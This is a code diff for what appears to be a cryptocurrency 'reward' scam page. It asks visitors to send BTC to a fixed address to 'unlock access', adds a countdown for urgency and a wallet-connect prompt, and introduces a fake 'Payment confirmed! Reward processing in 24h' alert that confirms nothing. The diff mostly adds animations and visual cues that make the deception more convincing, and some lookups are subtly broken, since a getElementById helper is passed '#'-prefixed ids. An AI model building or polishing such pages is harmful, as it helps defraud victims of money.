@@ -28,7 +28,14 @@ body {
 }
 
 button,a { font:inherit }
-button { cursor:pointer }
+button { 
+ cursor:pointer; 
+ transition: transform 0.1s, box-shadow 0.1s;
+}
+button:active {
+ transform: scale(0.96);
+ box-shadow: 0 0 15px #ffb90080 !important;
+}
 
 .wrap {
  max-width:1420px;
@@ -67,7 +74,7 @@ header {
 .cube {
  color:var(--gold);
  font-size:36px;
- text-shadow:0 0 18px #ffb800;
+ text-shadow:0 0 18px #ffb900;
 }
 
 .brand span:last-child { color:var(--gold) }
@@ -163,25 +170,11 @@ nav a:hover { color:var(--gold) }
  overflow:hidden;
 }
 
-.planet {
- position:absolute;
- width:360px;
- height:360px;
- border-radius:50%;
- background:radial-gradient(circle at 35% 30%,#285a7c,#09213b 55%,#020711 72%);
- box-shadow:0 0 75px #0c9bff44,inset -35px -25px 55px #000;
+@keyframes float {
+ 0% { transform: translateY(0) rotate(0deg); }
+ 50% { transform: translateY(-15px) rotate(1deg); }
+ 100% { transform: translateY(0) rotate(-1deg); }
 }
-
-.beam {
- position:absolute;
- bottom:35px;
- width:230px;
- height:80px;
- border:3px solid #ffbf00;
- border-radius:50%;
- box-shadow:0 0 25px #ffb900,inset 0 0 20px #ffb900;
-}
-
 .parachute {
  position:absolute;
  top:20px;
@@ -191,6 +184,7 @@ nav a:hover { color:var(--gold) }
  background:repeating-linear-gradient(90deg,#ffb900 0 32px,#ffe477 33px 43px,#9b6500 44px 48px);
  border:5px solid #ffe58b;
  box-shadow:0 0 35px #ffb900;
+ animation: float 6s ease-in-out infinite;
 }
 
 .parachute:after {
@@ -201,6 +195,30 @@ nav a:hover { color:var(--gold) }
  font-size:39px;
  font-weight:1000;
  color:#111;
+}
+
+@keyframes pulse {
+ 0% { box-shadow: 0 0 75px #0c9bff44, inset -35px -25px 55px #000; }
+ 50% { box-shadow: 0 0 90px #0c9bff88, inset -40px -30px 60px #000; }
+ 100% { box-shadow: 0 0 75px #0c9bff44, inset -35px -25px 55px #000; }
+}
+.planet {
+ position:absolute;
+ width:360px;
+ height:360px;
+ border-radius:50%;
+ background:radial-gradient(circle at 35% 30%,#285a7c,#09213b 55%,#020711 72%);
+ animation: pulse 4s ease-in-out infinite;
+}
+
+.beam {
+ position:absolute;
+ bottom:35px;
+ width:230px;
+ height:80px;
+ border:3px solid #ffbf00;
+ border-radius:50%;
+ box-shadow:0 0 25px #ffb900,inset 0 0 20px #ffb900;
 }
 
 .ropes {
@@ -226,6 +244,12 @@ nav a:hover { color:var(--gold) }
  font-size:48px;
  color:#fff1a4;
  box-shadow:0 0 35px #ffb900;
+ transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.crate.pulse {
+ transform: rotate(-7deg) scale(1.1);
+ box-shadow: 0 0 50px #ffb900;
 }
 
 .claim {
@@ -250,6 +274,7 @@ nav a:hover { color:var(--gold) }
  border-radius:10px;
  text-align:center;
  padding:11px 3px;
+ transition: color 0.2s, text-shadow 0.2s;
 }
 
 .time strong {
@@ -257,7 +282,7 @@ nav a:hover { color:var(--gold) }
  display:block;
 }
 
-.time small { color:var(--muted) }
+.time.small { color:var(--muted) }
 
 .stat {
  border-top:1px solid #293746;
@@ -338,6 +363,11 @@ nav a:hover { color:var(--gold) }
  align-items:center;
  justify-content:space-between;
  gap:12px;
+ transition: transform 0.2s;
+}
+
+.task:active {
+ transform: scale(0.98);
 }
 
 .task button {
@@ -346,11 +376,17 @@ nav a:hover { color:var(--gold) }
  border:1px solid #876716;
  border-radius:9px;
  padding:9px 12px;
+ transition: all 0.2s;
+}
+
+.task button:hover {
+ background:#1a3044;
 }
 
 .task button.done {
- color:#9fe6ae;
- border-color:#367d4c;
+ background: #2a5d49;
+ color: #9fe6ae;
+ border-color: #367d4c;
 }
 
 .metrics {
@@ -540,10 +576,10 @@ footer {
 <div id="modal-btc-payment" class="modal">
  <div class="modal-content">
   <h3 style="margin:0 0 15px;color:var(--gold)">🔷 Complete Payment</h3>
-  <p class="muted" style="margin-bottom:15px;">Send <strong id="btc-amount">0.0005</strong> BTC to unlock access.</p>
-  <div style="background:#0b1724;padding:14px;border-radius:12px;margin:15px 0;font-family:monospace;font-size:14px;">bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd</div>
+  <p class="muted" style="margin-bottom:15px;">Send <strong id="btc-amount">0.000167</strong> BTC to unlock access.</p>
+  <div style="background:#0b1724;padding:14px;border-radius:12px;margin:15px 0;font-family:monospace;font-size:14px;" id="btc-address">bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd</div>
   <div class="notice" style="margin:12px 0;">⚠️ Send exact BTC amount. Do not use exchange wallets.</div>
-  <button class="btn" onclick="alert('✅ Payment confirmed. Reward processing in 24h.');this.closest('.modal').style.display='none';">I’ve Sent BTC</button>
+  <button class="btn" onclick="paymentConfirmed()">I’ve Sent BTC</button>
   <button class="btn secondary" style="margin-top:10px;" onclick="this.closest('.modal').style.display='none'">Back</button>
  </div>
 </div>
@@ -564,7 +600,7 @@ footer {
 
 <script>
 // CONFIG
-const BTC_PRICE_USD = 60000; // Update if needed
+const BTC_PRICE_USD = 60000;
 const YOUR_BTC_ADDRESS = 'bc1qvf452l052yxuksh483qmpqxsy0dcn6rt6fn3gd';
 const $ = id => document.getElementById(id);
 
@@ -604,17 +640,24 @@ function generatePackages() {
   `;
   container.appendChild(el);
  });
- // Attach events
+ attachPackageEvents();
+}
+generatePackages();
+
+function attachPackageEvents() {
  document.querySelectorAll('[data-btc]').forEach(btn => {
-  btn.addEventListener('click', () => {
-   const btc = btn.dataset.btc;
+  btn.addEventListener('click', function() {
+   const btc = this.dataset.btc;
    $('#btc-amount').textContent = btc;
-   document.querySelector('#modal-btc-payment .muted strong').textContent = btc;
-   openModal('modal-btc-payment');
+   $('#modal-btc-payment').style.display = 'flex';
+   // Visual feedback
+   this.style.background = '#9fe6ae';
+   this.style.color = '#111';
+   this.innerHTML = '✅ Paid';
+   this.disabled = true;
   });
  });
 }
-generatePackages();
 
 // MODAL CONTROLS
 function openModal(id) {
@@ -637,27 +680,63 @@ document.querySelectorAll('nav a').forEach(link => {
 $('connectTop').onclick = () => openModal('modal-access');
 $('connectHero').onclick = () => {
  $('#btc-amount').textContent = '0.000167';
- document.querySelector('#modal-btc-payment .muted strong').textContent = '0.000167';
  openModal('modal-btc-payment');
 };
 
 // WALLET CONNECT
 $('start-wallet-flow').onclick = async () => {
+ const btn = $('start-wallet-flow');
+ btn.textContent = 'Connecting...';
+ btn.disabled = true;
  if (!window.ethereum) {
-  alert('Install MetaMask or Trust Wallet to continue.');
+  alert('Wallet not detected. Install MetaMask or Trust Wallet.');
+  btn.textContent = 'Connect Wallet';
+  btn.disabled = false;
   return;
  }
  try {
   const provider = new ethers.BrowserProvider(window.ethereum);
   const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
   if (accounts.length) {
-   document.getElementById('walletStatus').textContent = 'Connected: ' + accounts[0].slice(0,6) + '...' + accounts[0].slice(-4);
+   document.getElementById('walletStatus').textContent = '✅ Connected: ' + accounts[0].slice(0,10) + '...';
    openModal('modal-tier-select');
   }
  } catch(e) {
-  if (e.code !== 4001) alert('Connection failed.');
+  alert('Connection rejected or failed.');
  }
+ btn.textContent = 'Connect Wallet';
+ btn.disabled = false;
 };
+
+// PAYMENT CONFIRMED
+function paymentConfirmed() {
+ shakeCrate();
+ flashTimer();
+ alert('✅ Payment confirmed! Reward processing in 24h. Check your wallet.');
+ document.getElementById('modal-btc-payment').style.display = 'none';
+}
+
+// SHAKE CRATE
+function shakeCrate() {
+ const crate = document.querySelector('.crate');
+ crate.classList.add('pulse');
+ setTimeout(() => crate.classList.remove('pulse'), 500);
+}
+
+// FLASH TIMER
+function flashTimer() {
+ const timeEls = document.querySelectorAll('.time');
+ timeEls.forEach(el => {
+  el.style.color = '#ffe17a';
+  el.style.textShadow = '0 0 15px #ffb900';
+ });
+ setTimeout(() => {
+  timeEls.forEach(el => {
+   el.style.color = '';
+   el.style.textShadow = '';
+  });
+ }, 300);
+}
 
 // LEADERBOARD
 document.getElementById('leaderboard').onclick = () => openModal('modal-leaderboard');
@@ -669,14 +748,24 @@ document.getElementById('about').onclick = () => {
 
 // COUNTDOWN TIMER
 let r = 5*86400 + 12*3600 + 34*60 + 59;
-setInterval(() => {
+function tick() {
  const d = Math.floor(r/86400), h = Math.floor(r%86400/3600), m = Math.floor(r%3600/60), s = r%60;
- $('days').textContent = d.toString().padStart(2,'0');
- $('hours').textContent = h.toString().padStart(2,'0');
- $('minutes').textContent = m.toString().padStart(2,'0');
- $('seconds').textContent = s.toString().padStart(2,'0');
+ const update = (el, val) => {
+  el.textContent = val.toString().padStart(2,'0');
+  el.style.color = '#ffe17a';
+  el.style.textShadow = '0 0 10px #ffb900';
+  setTimeout(() => {
+   el.style.color = '';
+   el.style.textShadow = '';
+  }, 200);
+ };
+ update($('days'), d);
+ update($('hours'), h);
+ update($('minutes'), m);
+ update($('seconds'), s);
  if (r > 0) r--;
-}, 1000);
+}
+setInterval(tick, 1000);
 </script>
 
 </body>
